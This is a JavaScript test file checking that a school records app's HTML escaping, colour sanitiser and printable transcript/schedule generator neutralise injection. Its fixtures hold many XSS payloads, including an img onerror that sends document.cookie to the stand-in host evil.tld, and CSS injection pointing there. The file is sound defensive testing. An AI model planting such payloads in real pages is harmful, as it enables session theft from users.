import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { createRequire, Module } from "node:module";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import ts from "typescript";

function loadTs(url, aliasMap = {}) {
    const filename = fileURLToPath(url);
    const { outputText } = ts.transpileModule(readFileSync(url, "utf8"), {
        fileName: filename,
        compilerOptions: {
            module: ts.ModuleKind.CommonJS,
            target: ts.ScriptTarget.ES2022,
        },
    });
    const mod = new Module(filename);
    const baseRequire = createRequire(url);
    mod.require = (id) => {
        if (aliasMap[id]) {
            return aliasMap[id];
        }
        return baseRequire(id);
    };
    mod._compile(outputText, filename);
    return mod.exports;
}

const utilsUrl = new URL("../../resources/js/lib/utils.ts", import.meta.url);
const utils = loadTs(utilsUrl);
const { escapeHtml } = utils;

const gwaUrl = new URL("../../resources/js/lib/gwa.ts", import.meta.url);
const gwa = loadTs(gwaUrl);

const printHtmlUrl = new URL("../../resources/js/pages/administrators/students/components/print-schedule-html.ts", import.meta.url);
const printHtmlModule = loadTs(printHtmlUrl, {
    "@/lib/utils": utils,
    "@/lib/gwa": gwa,
});
const { generatePrintDocumentHtml, sanitizeColor, formatYearLevel, formatSemester } = printHtmlModule;

test("escapeHtml correctly escapes special characters and handles null/undefined/numbers", () => {
    assert.strictEqual(escapeHtml(null), "");
    assert.strictEqual(escapeHtml(undefined), "");
    assert.strictEqual(escapeHtml(123), "123");
    assert.strictEqual(
        escapeHtml(`<img src=x onerror="fetch('//evil.tld/?c='+document.cookie)">`),
        "&lt;img src=x onerror=&quot;fetch(&#039;//evil.tld/?c=&#039;+document.cookie)&quot;&gt;",
    );
    assert.strictEqual(escapeHtml("<script>alert('xss')</script>"), "&lt;script&gt;alert(&#039;xss&#039;)&lt;/script&gt;");
    assert.strictEqual(escapeHtml("Tom & Jerry"), "Tom &amp; Jerry");
});

test("sanitizeColor accepts valid hex colors and neutralizes injection attempts", () => {
    assert.strictEqual(sanitizeColor("#3b82f6"), "#3b82f6");
    assert.strictEqual(sanitizeColor("#fff"), "#fff");
    assert.strictEqual(sanitizeColor("red; background-image: url('//evil.tld')"), "#666666");
    assert.strictEqual(sanitizeColor('"><script>alert(1)</script>'), "#666666");
    assert.strictEqual(sanitizeColor(null), "#666666");
});

test("formatYearLevel and formatSemester produce standard labels", () => {
    assert.strictEqual(formatYearLevel(1), "1st Year");
    assert.strictEqual(formatYearLevel(2), "2nd Year");
    assert.strictEqual(formatYearLevel(3), "3rd Year");
    assert.strictEqual(formatYearLevel(4), "4th Year");
    assert.strictEqual(formatYearLevel(null), "Unspecified Year");

    assert.strictEqual(formatSemester(1), "1st Semester");
    assert.strictEqual(formatSemester(2), "2nd Semester");
    assert.strictEqual(formatSemester(3), "Summer");
    assert.strictEqual(formatSemester(null), "Unspecified Semester");
});

const maliciousStudent = {
    id: 1,
    student_id: '<b onmouseover="alert(1)">STU-001</b>',
    name: "Jane <img src=x onerror=\"fetch('//evil.tld/?c='+document.cookie)\"> Doe",
    first_name: "Jane",
    middle_name: null,
    last_name: "Doe",
    email: "jane@example.com",
    phone: null,
    gender: "Female",
    birth_date: null,
    type: "regular",
    status: '<span onclick="alert(1)">Active</span>',
    graduation_school_year: null,
    graduation_semester: null,
    academic_year: '4th <script>alert("yr")</script> Year',
    academic_year_value: 4,
    course: {
        id: 1,
        code: 'BSCS<svg/onload=alert("code")>',
        title: 'Computer Science <script>alert("course")</script>',
    },
    created_at: null,
    updated_at: null,
    deleted_at: null,
    is_trashed: false,
    contacts: null,
    parents: null,
    education: null,
    personal_info: null,
    documents: null,
    signature_url: null,
    current_clearance: null,
    previous_clearance_validation: null,
    clearance_history: [],
    tuition: null,
    current_school_year: '2026-2027"><script>alert("sy")</script>',
    current_semester: 1,
    current_enrolled_classes: [
        {
            class_id: 10,
            subject_code: 'CS101<script>alert("code")</script>',
            subject_title: 'Intro to CS <img src=x onerror=alert("title")>',
            units: 3,
            section: 'A<script>alert("sec")</script>',
            faculty: 'Dr. Evil <img src=x onerror=alert("faculty")>',
            color: 'blue; background: url("//evil.tld/xss.png")',
            schedules: [
                {
                    day: 'Mon<script>alert("day")</script>',
                    start_time: "08:00:00",
                    end_time: "10:00:00",
                    room: 'Lab 1 <img src=x onerror=alert("room")>',
                },
            ],
        },
    ],
    checklist: [
        {
            year: 1,
            semesters: [
                {
                    semester: 1,
                    subjects: [
                        {
                            id: 101,
                            enrollment_id: 201,
                            code: 'CS101<script>alert("chk")</script>',
                            title: 'Intro <img src=x onerror=alert("sub")>',
                            units: 3,
                            classification: 'internal<script>alert("class")</script>',
                            status: "Completed",
                            grade: '1.0<script>alert("grade")</script>',
                            remarks: 'Excellent <img src=x onerror=alert("remark")>',
                            history: [
                                {
                                    id: 200,
                                    grade: '3.0<script>alert("hist-grade")</script>',
                                    remarks: 'Retake <script>alert("hist-remark")</script>',
                                    classification: "internal",
                                    school_name: 'Main Campus <script>alert("campus")</script>',
                                    school_year: "2025-2026",
                                    semester: 1,
                                    academic_year: 1,
                                },
                            ],
                        },
                    ],
                },
            ],
        },
    ],
    non_credited_subjects: [
        {
            id: 301,
            academic_year: 1,
            school_name: 'Transferred University <script>alert("trans-school")</script>',
            school_year: "2024-2025",
            semester: 2,
            external_subject_code: 'EXT101<script>alert("ext-code")</script>',
            external_subject_title: 'External Calc <img src=x onerror=alert("ext-title")>',
            external_subject_units: 3,
            grade: "2.0",
            remarks: 'Credited <script>alert("ext-remark")</script>',
            linked_subject: {
                code: 'MATH101<script>alert("link-code")</script>',
                title: 'Calculus <img src=x onerror=alert("link-title")>',
            },
        },
    ],
};

const dangerousSubstrings = [
    '<script>alert("yr")</script>',
    '<script>alert("course")</script>',
    '<script>alert("sy")</script>',
    '<script>alert("code")</script>',
    '<script>alert("sec")</script>',
    '<script>alert("day")</script>',
    '<script>alert("chk")</script>',
    '<script>alert("class")</script>',
    '<script>alert("grade")</script>',
    '<script>alert("hist-grade")</script>',
    '<script>alert("hist-remark")</script>',
    '<script>alert("campus")</script>',
    '<script>alert("trans-school")</script>',
    '<script>alert("ext-code")</script>',
    '<script>alert("ext-remark")</script>',
    '<script>alert("link-code")</script>',
    "onerror=\"fetch('//evil.tld/?c='+document.cookie)\"",
    'onerror=alert("title")',
    'onerror=alert("faculty")',
    'onerror=alert("room")',
    'onerror=alert("sub")',
    'onerror=alert("remark")',
    'onerror=alert("ext-title")',
    'onerror=alert("link-title")',
    'onmouseover="alert(1)"',
    'onclick="alert(1)"',
    '<svg/onload=alert("code")>',
];

test("generatePrintDocumentHtml for 'both' option escapes all student, class, and schedule fields", () => {
    const html = generatePrintDocumentHtml({
        student: maliciousStudent,
        orgName: "KoAkademy <script>alert('org')</script>",
        printOption: "both",
    });

    for (const danger of dangerousSubstrings) {
        assert.ok(!html.includes(danger), `HTML must not contain unescaped payload: ${danger}`);
    }

    assert.ok(html.includes("&lt;img src=x onerror=&quot;fetch(&#039;//evil.tld/?c=&#039;+document.cookie)&quot;&gt;"));
    assert.ok(html.includes("&lt;script&gt;alert(&quot;code&quot;)&lt;/script&gt;"));
    assert.ok(
        html.includes("&lt;script&gt;alert(&quot;room&quot;)&lt;/script&gt;") || html.includes("&lt;img src=x onerror=alert(&quot;room&quot;)&gt;"),
    );
});

test("generatePrintDocumentHtml for 'transcript' option escapes all internal and external records", () => {
    const html = generatePrintDocumentHtml({
        student: maliciousStudent,
        orgName: "KoAkademy",
        printOption: "transcript",
    });

    for (const danger of dangerousSubstrings) {
        assert.ok(!html.includes(danger), `Transcript must not contain unescaped payload: ${danger}`);
    }

    assert.ok(html.includes("Official Transcript of Records"));
    assert.ok(html.includes("&lt;script&gt;alert(&quot;trans-school&quot;)&lt;/script&gt;"));
    assert.ok(html.includes("&lt;script&gt;alert(&quot;ext-remark&quot;)&lt;/script&gt;"));
});

test("generatePrintDocumentHtml for 'checklist_full' option escapes all checklist items and remarks", () => {
    const html = generatePrintDocumentHtml({
        student: maliciousStudent,
        orgName: "KoAkademy",
        printOption: "checklist_full",
    });

    for (const danger of dangerousSubstrings) {
        assert.ok(!html.includes(danger), `Checklist must not contain unescaped payload: ${danger}`);
    }

    assert.ok(html.includes("Curriculum Checklist"));
    assert.ok(html.includes("&lt;script&gt;alert(&quot;hist-remark&quot;)&lt;/script&gt;"));
});

test("generatePrintDocumentHtml for 'checklist_completed' option escapes all passed subjects", () => {
    const html = generatePrintDocumentHtml({
        student: maliciousStudent,
        orgName: "KoAkademy",
        printOption: "checklist_completed",
    });

    for (const danger of dangerousSubstrings) {
        assert.ok(!html.includes(danger), `Checklist completed must not contain unescaped payload: ${danger}`);
    }

    assert.ok(html.includes("Academic Transcript"));
});
